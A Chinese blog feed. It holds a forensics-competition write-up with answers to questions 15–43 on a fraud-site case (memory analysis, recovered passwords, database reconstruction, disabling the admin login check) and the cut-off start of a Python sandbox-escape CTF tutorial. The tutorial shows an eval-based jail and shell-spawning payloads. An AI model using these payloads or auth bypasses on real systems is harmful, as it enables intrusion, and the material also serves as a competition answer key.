id="15-请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx"><a href="#15-请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？-答案格式：xxxx-xx" class="headerlink" title="15.请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]"></a>15.请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？[答案格式：xxxx(xx)]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309172313216.png" alt="image-20230917231314046"></p><pre><code>2023春季更新(14309)</code></pre><h3 id="16-请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写"><a href="#16-请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？-答案格式：字母小写" class="headerlink" title="16.请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]"></a>16.请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？[答案格式：字母小写]</h3><p>先将这个文件 从虚拟机中提取出来 </p><p>直接放在火眼中进行分析 找到<code>C盘清理.bat</code> 直接计算哈希 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192220013.png" alt="image-20230919222021755"></p><pre><code>24CFCFDF1FA894244F904067838E7E01E28FF450</code></pre><h3 id="17-请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin"><a href="#17-请给出嫌疑人Vera-Crypt加密容器的解密密码？-答案格式：admin" class="headerlink" title="17.请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]"></a>17.请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]</h3><p>取证大师  直接全剧搜索密码  可以找到一个<code>密码.txt</code><br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192233993.png" alt="image-20230919223305940"></p><h3 id="18-请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080"><a href="#18-请给出嫌疑人电脑内iSCSI服务器对外端口号？-答案格式：8080" class="headerlink" title="18.请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]"></a>18.请给出嫌疑人电脑内iSCSI服务器对外端口号？[答案格式：8080]</h3><p>之后看wp才明白 仿真起的计算机中有一个<code>starwind</code> 软件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192253879.png" alt="image-20230919225344826"></p><p>与服务器的端口号有关系 找到这个软件并运行 就可以看到端口号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192255001.png" alt="image-20230919225501908"></p><pre><code>3261</code></pre><h3 id="19-请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-x2F-admin"><a href="#19-请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？-答案格式：root-x2F-admin" class="headerlink" title="19.请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]"></a>19.请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？[答案格式：root&#x2F;admin]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192307014.png" alt="image-20230919230706961"></p><p>从软件中看出 CHAP认证的账户名是<code>user</code> 导出starwind的文件夹 直接全局搜索账户名 找到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192306919.png" alt="image-20230919230645883"></p><pre><code>panguite.com</code></pre><h3 id="20-分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000"><a href="#20-分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？-答案格式：10000" class="headerlink" title="20.分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]"></a>20.分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]</h3><p>17题找到了 vc容器密码 接下来找一下vc容器 发现<code>20134133datqwer.txt</code>的大小是2gb 很可能是vc容器</p><p>尝试进行挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192325958.png" alt="image-20230919232540905"></p><p>挂载出很多excel表格 找到提现记录表格 在里面筛选出<code>mi518888</code>的提现记录 在求和即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192327457.png" alt="image-20230919232701378"></p><pre><code>1019</code></pre><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><h3 id="21-请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00"><a href="#21-请给出计算机内存创建北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="21.请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]"></a>21.请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem imageinfo</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131429.png" alt="image-20230915141725330"></p><pre><code>2023-06-21 01:02:27</code></pre><h3 id="22-请给出计算机内用户yang88的开机密码？-答案格式：abc-123"><a href="#22-请给出计算机内用户yang88的开机密码？-答案格式：abc-123" class="headerlink" title="22.请给出计算机内用户yang88的开机密码？[答案格式：abc.123]"></a>22.请给出计算机内用户yang88的开机密码？[答案格式：abc.123]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131430.png" alt="image-20230915142218823"></p><pre><code>3w.qax.com</code></pre><h3 id="23-提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00"><a href="#23-提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="23.提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11 00:00:00]"></a>23.提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？[答案格式：2000-01-11 00:00:00]</h3><p>两种方法</p><h4 id="法一：直接取证软件梭"><a href="#法一：直接取证软件梭" class="headerlink" title="法一：直接取证软件梭"></a>法一：直接取证软件梭</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131431.png" alt="image-20230915143329000"></p><p>但是这里需要注意 内存镜像制作完的时间是<code>2023-06-21 01:02:27</code> 因此对于内存镜像来说 usb插拔的时间不能超过这个内存镜像制作好的时间</p><p>所以 usb最后连接的北京时间是</p><pre><code>2023-06-21 01:01:25</code></pre><h4 id="法二：vol进行查取"><a href="#法二：vol进行查取" class="headerlink" title="法二：vol进行查取"></a>法二：vol进行查取</h4><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  printkey -K &quot;ControlSet001\Enum\USBSTOR&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131432.png" alt="image-20230915143942225"></p><p>但是这里需要注意 <code>UTC</code> 是世界统一时间 而北京时间是<code>UTC +0800</code> 这里的时间表示法是<code>UTC +0000</code> 所以北京时间要在查取到的时间的基础上加8h 也就是 </p><pre><code>2023-06-21 01:01:25</code></pre><h3 id="24-请给出用户yang88的LMHASH值？"><a href="#24-请给出用户yang88的LMHASH值？" class="headerlink" title="24.请给出用户yang88的LMHASH值？"></a>24.请给出用户yang88的LMHASH值？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131433.png" alt="image-20230915144924733"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131434.png" alt="image-20230915144938875"></p><pre><code>aad3b435b51404eeaad3b435b51404ee</code></pre><h3 id="25-请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#25-请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="25.请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11 00:00:00]"></a>25.请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？[答案格式：2000-01-11 00:00:00]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  hashdump</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230826115350136.png" alt="image-20230826115350136"></p><pre><code>2023-06-21 00:29:16</code></pre><h3 id="26-请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00"><a href="#26-请给出“VeraCrypt”最后一次执行的北京时间？-答案格式：2000-01-11-00-00-00" class="headerlink" title="26.请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]"></a>26.请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  pslist | findstr &quot;Vera&quot;# 列出该内存的所有进程信息或.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64 userassist# 提取出内存中记录的 当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131435.png" alt="image-20230915145823193"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131436.png" alt="image-20230915150248535"></p><p>同样 因为是北京时间 所以要加8h</p><pre><code>2023-06-21 00:47:41</code></pre><h3 id="27-分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10"><a href="#27-分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？-答案格式-10" class="headerlink" title="27.分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]"></a>27.分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？[答案格式:10]</h3><p>使用AXIOM对内存镜像进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230826131337118.png" alt="image-20230826131337118"></p><p>可以发现是访问了后台url两次</p><pre><code>2</code></pre><h3 id="28-请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234"><a href="#28-请给出用户最后一次访问chrome浏览器的进程PID？-答案格式：1234" class="headerlink" title="28.请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]"></a>28.请给出用户最后一次访问chrome浏览器的进程PID？[答案格式：1234]</h3><pre><code class="bash">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x64  pslist | findstr &quot;chrome&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131437.png" alt="image-20230915152827252"></p><p>看时间 最后一次访问的PID是</p><pre><code>2456</code></pre><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><h3 id="29-分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx"><a href="#29-分析涉案服务器，请给出涉案服务器的内核版本？-答案格式：xx-xxx-xxx-xx-xx" class="headerlink" title="29.分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]"></a>29.分析涉案服务器，请给出涉案服务器的内核版本？[答案格式：xx.xxx-xxx.xx.xx]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131438.png" alt="image-20230920231522483"></p><pre><code>3.10.0-957.el7.x86_64</code></pre><h3 id="30-分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123"><a href="#30-分析涉案服务器，请给出MySQL数据库的root账号密码？-答案格式：Admin123" class="headerlink" title="30.分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]"></a>30.分析涉案服务器，请给出MySQL数据库的root账号密码？[答案格式：Admin123]</h3><p>仿真起服务器 连上xshell 先看一下有无宝塔</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221130479.png" alt="image-20230922113038389"></p><p>有 改下密码 等宝塔看看</p><p>在<code>/www/wwwroot/v9.licai.com/config</code> 下找到一个<code>database.php</code>  其中的所有数据库信息都是用env这个函数表示的 在宝塔文件夹中找一找有关env的文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221132760.png" alt="image-20230922113203692"></p><p>在<code>/www/wwwroot/v9.licai.com</code>下有个<code>.env</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221136628.png" alt="image-20230922113616597"></p><p>找到密码</p><pre><code>ff1d923939ca2dcf</code></pre><h3 id="31-分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx"><a href="#31-分析涉案服务器，请给出涉案网站RDS数据库地址？-答题格式-xx-xx-xx-xx-xx-xx" class="headerlink" title="31.分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]"></a>31.分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]</h3><p>RDS数据库其实就是阿里云的数据库</p><pre><code>阿里云关系型数据库RDS（Relational Database Service）是一种可弹性伸缩的在线数据库服务，基于阿里云分布式文件系统和SSD盘高性能存储，采用双机热备，数据多副本冗余及自动备份机制。RDS支持MySQL、SQL Server、PostgreSQL、PPAS（Postgre Plus Advanced Server，高度兼容Oracle数据库）和MariaDB TX引擎，并且提供了容灾、备份、恢复、监控、迁移等方面的全套解决方案。</code></pre><p>所以答案就在 上一题找到的有关数据库的信息中</p><pre><code>pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com</code></pre><h3 id="32-请给出涉网网站数据库版本号-答题格式-5-6-00"><a href="#32-请给出涉网网站数据库版本号-答题格式-5-6-00" class="headerlink" title="32.请给出涉网网站数据库版本号? [答题格式: 5.6.00]"></a>32.请给出涉网网站数据库版本号? [答题格式: 5.6.00]</h3><p>在<code>/www/server</code>下 有很多有关数据库的文件夹 在里面找到mysql的 在<code>version.pl</code>中 找到版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309221150824.png" alt="image-20230922115027774"></p><pre><code>5.7.40</code></pre><p>或者直接命令行</p><pre><code>mysql -Version</code></pre><h3 id="33-请给出嫌疑人累计推广人数？-答案格式：100"><a href="#33-请给出嫌疑人累计推广人数？-答案格式：100" class="headerlink" title="33.请给出嫌疑人累计推广人数？[答案格式：100]"></a>33.请给出嫌疑人累计推广人数？[答案格式：100]</h3><p>大体思路是使用火眼的数据库工具还原数据库 建立本地连接——使用navicat将viplicai数据库保存为sql格式数据库——仿真服务器——navicat使用ssh连接服务器——将还原出的数据库部署到服务器上——在宝塔中建立域名规则访问网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232000939.png" alt="image-20230923195955857"></p><p>将给出的xb后缀阿里云数据库文件放到火眼的数据库分析工具中 成功还原出数据库信息 找到重构网站所需的viplicai数据库 进行解析 建立本地连接</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232002524.png" alt="image-20230923200230469"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232003512.png" alt="image-20230923200329467"></p><p>得到建立了本地连接的端口 用户名 密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232005051.png" alt="image-20230923200527014"></p><p>成功使用navicat建立本地连接 再将viplicai数据库 转储为sql文件<code>viplicai.sql</code> </p><p>这里学到一个点 <font color='red'>mysql数据库绕过密码</font></p><p><a href="https://blog.csdn.net/weixin_44156366/article/details/104960518?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E7%BB%95%E8%BF%87mysql8%E5%AF%86%E7%A0%81&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-104960518.142%5Ev94%5Einsert_down28v1&spm=1018.2226.3001.4187">linux mysql8免密登录</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232038028.png" alt="image-20230923203822975"></p><pre><code>vim /etc/my.cnf</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232039189.png" alt="image-20230923203944160"></p><p>再加上一个小点 因为我们后面需要ssh连上服务器 再将刚刚保存的viplicai.sql文件 迁移到服务器中 在这个服务器中 又是mysql8的高版本 需要注意在数据迁移过程中的大小写敏感问题</p><p>因此 在<code>my.cnf</code>文件配置中再加上一条</p><pre><code>lower_case_table_names = 1</code></pre><p><a href="https://blog.csdn.net/qq_42768234/article/details/125002150?ops_request_misc=&request_id=&biz_id=102&utm_term=lower_case_table_names=1%E7%9A%84%E4%BD%9C%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-125002150.142%5Ev94%5Einsert_down28v1&spm=1018.2226.3001.4187">MySQL 数据迁移中 lower_case_table_names 参数影响</a></p><p>接下来 navicat中使用ssh连接服务器 在将运行sql文件 将viplicai.sql转移到服务器上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232110127.png" alt="image-20230923211014078"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232110375.png" alt="image-20230923211030336"></p><p>在登陆mysql服务 就可以看到vip.licai.com数据库了</p><p>再次修改<code>.env</code>的内容 将网站使用的数据库改成我们添加的vip.licai.com数据库  host改为localhost</p><p>在分析计算机时 在嫌疑人浏览器的历史记录中 找到了目标网站的后台登陆网址(其实在内存镜像中也有)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232121519.png" alt="image-20230923212116486"></p><p>在宝塔中新建一个域名规则 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232148965.png" alt="image-20230923214827915"></p><p>访问成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232149974.png" alt="image-20230923214911758"></p><p>但是密码是处于加密状态 找到登陆的源码 </p><pre><code>/www/wwwroot/v9.licai.com/app/Http/Controllers/Admin/LoginController.php</code></pre><p>直接将验证密码这一部分的源码注释掉 改成任意密码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232215630.png" alt="image-20230923221500578"></p><p>但还会有一个登陆时间的限制</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232216114.png" alt="image-20230923221640050"></p><p>直接将这一部分代码 删掉就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232217878.png" alt="image-20230923221726830"></p><p>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309232218501.png" alt="image-20230923221849390"></p><p>直接搜yang88(嫌疑人)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241959064.png" alt="image-20230924195955022"></p><pre><code>69</code></pre><h3 id="34-请给出涉案网站后台启用的超级管理员-答题格式-abc"><a href="#34-请给出涉案网站后台启用的超级管理员-答题格式-abc" class="headerlink" title="34.请给出涉案网站后台启用的超级管理员?[答题格式:abc]"></a>34.请给出涉案网站后台启用的超级管理员?[答题格式:abc]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241811392.png" alt="image-20230924181112325"></p><pre><code>admin</code></pre><h3 id="35-投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00"><a href="#35-投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00" class="headerlink" title="35.投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]"></a>35.投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241931074.png" alt="image-20230924193137000"></p><pre><code>4.00%</code></pre><h3 id="36-最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8"><a href="#36-最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8" class="headerlink" title="36.最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]"></a>36.最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241934678.png" alt="image-20230924193441618"></p><pre><code>183.160.76.194</code></pre><h3 id="37-分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100"><a href="#37-分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100" class="headerlink" title="37.分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]"></a>37.分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241942450.png" alt="image-20230924194259413"></p><p>由图可知 VIP2的会员等级是3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241944250.png" alt="image-20230924194438213"></p><p>一共是20个</p><h3 id="38-分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8"><a href="#38-分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8" class="headerlink" title="38.分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]"></a>38.分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]</h3><p>搜索上海  找到两个人 在查看具体信息 账户中的余额都大于0</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309241947837.png" alt="image-20230924194743782"></p><pre><code>2</code></pre><h3 id="39-分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00"><a href="#39-分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00" class="headerlink" title="39.分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]"></a>39.分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242000264.png" alt="image-20230924200016232"></p><pre><code>128457.00</code></pre><h3 id="40-分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123"><a href="#40-分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123" class="headerlink" title="40.分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]"></a>40.分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]</h3><p>由案情可知 上线就是嫌疑人yang88 其邀请码是513935</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242002674.png" alt="image-20230924200244616"></p><p>将成员表导出 对邀请码进行排序 选出邀请码为<code>513935</code>的人员 一共17个</p><pre><code>17</code></pre><h3 id="41-分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10"><a href="#41-分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10" class="headerlink" title="41.分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]"></a>41.分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]</h3><p>在member.xlsx中邀请码那一列导出 先算出重复出现的次数 </p><p>要用到countif函数</p><p><a href="https://blog.csdn.net/en_joker/article/details/106634116?ops_request_misc=&request_id=&biz_id=102&utm_term=%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8excel%E8%AE%A1%E6%95%B0%20%E8%BF%94%E5%9B%9E%E6%AF%8F%E4%B8%AA%E6%95%B0%E5%AD%97%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-106634116.142%5Ev94%5Einsert_down28v1&spm=1018.2226.3001.4449">excel算出重复次数</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242055498.png" alt="image-20230924205535455"></p><p>在对次数这一列 进行排序 可以看到次数大于3的邀请码一共有60个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242056284.png" alt="image-20230924205628233"></p><p>所以满足条件的代理一共有60个</p><h3 id="42-分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三"><a href="#42-分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三" class="headerlink" title="42.分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]"></a>42.分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]</h3><p>接上一题 由上表可以知道使用次数最多的邀请码是617624 也就是说下线最多的代理的邀请码是617624 直接在数据库中搜索 找到对应代理</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242100346.png" alt="image-20230924210022304"></p><pre><code>骆潇原</code></pre><h3 id="43-分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00"><a href="#43-分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00" class="headerlink" title="43.分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00]"></a>43.分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00]</h3><p>使用sql语句直接在数据库中进行查询</p><pre><code>select (SELECT sum(moneylog_money) FROM moneylog WHERE moneylog_status=&#39;+&#39;)-(SELECT sum(moneylog_money) FROM moneylog WHERE moneylog_status=&#39;-&#39;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242126385.png" alt="image-20230924212640350"></p><pre><code>15078796.38</code></pre>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初识沙箱逃逸</title>
      <link href="/2023/08/05/%E5%88%9D%E8%AF%86%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/05/%E5%88%9D%E8%AF%86%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="初识沙箱逃逸"><a href="#初识沙箱逃逸" class="headerlink" title="初识沙箱逃逸"></a>初识沙箱逃逸</h1><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-沙箱逃逸"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-沙箱逃逸" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)</h2><p>给了源码</p><pre><code class="python">#Your goal is to read ./flag.txt#You can use these payload liked `__import__(&#39;os&#39;).system(&#39;cat ./flag.txt&#39;)` or `print(open(&#39;/flag.txt&#39;).read())`WELCOME = &#39;&#39;&#39;  _     ______      _                              _       _ _  | |   |  ____|    (_)                            | |     (_) | | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| | | &#39;_ \|  __| / _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|  _   | |/ _` | | | | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | | |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|               __/ |                                                         |___/                                            &#39;&#39;&#39;print(WELCOME)print(&quot;Welcome to the python jail&quot;)print(&quot;Let&#39;s have an beginner jail of calc&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)input_data = input(&quot;&gt; &quot;)print(&#39;Answer: &#123;&#125;&#39;.format(eval(input_data)))</code></pre><p>什么也没有过滤 并且给了提示 可以使用上面两种payload  </p><p>这里尝试使用交互式操作 </p><pre><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code></pre><p>解释一下</p><pre><code>__import__(&#39;os&#39;)：这是一个使用内置函数 __import__ 来导入 Python 模块 os 的代码。os 模块提供了与操作系统交互的功能，例如执行系统命令、文件操作等。os.system(&#39;sh&#39;)：在导入了 os 模块后，该代码执行了 os.system(&#39;sh&#39;)。os.system() 函数是用于执行系统命令的，它接受一个字符串参数，将其中的命令在终端或命令提示符中执行。在这里，它试图执行命令 sh。sh 是一个常用的 Unix/Linux 命令行解释器（shell），它是命令行的一个交互式解释器，允许用户输入命令并执行。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230730220144872.png" alt="image-20230730220144872"></p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL-沙箱逃逸-chr-SSTI注入"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL-沙箱逃逸-chr-SSTI注入" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL 沙箱逃逸 chr() SSTI注入)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL 沙箱逃逸 chr() SSTI注入)</h2><p>也是给出了源码 但是在其中绕过了单引号、双引号、反斜杠、反引号和i、b两个字母</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230730220420343.png" alt="image-20230730220420343"></p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>下面使用一种方法：<code>python模板注入</code> 简称<code>SSTI</code></p><p>python中的元组、列表、字典、字符串等都是对象 可以用过<code>__class__</code>这个函数来进行查看  可以看到父类是<code>object</code> 可以说任何类的父类都是<code>object</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163225243.png" alt="image-20230731163225243"></p><p><img 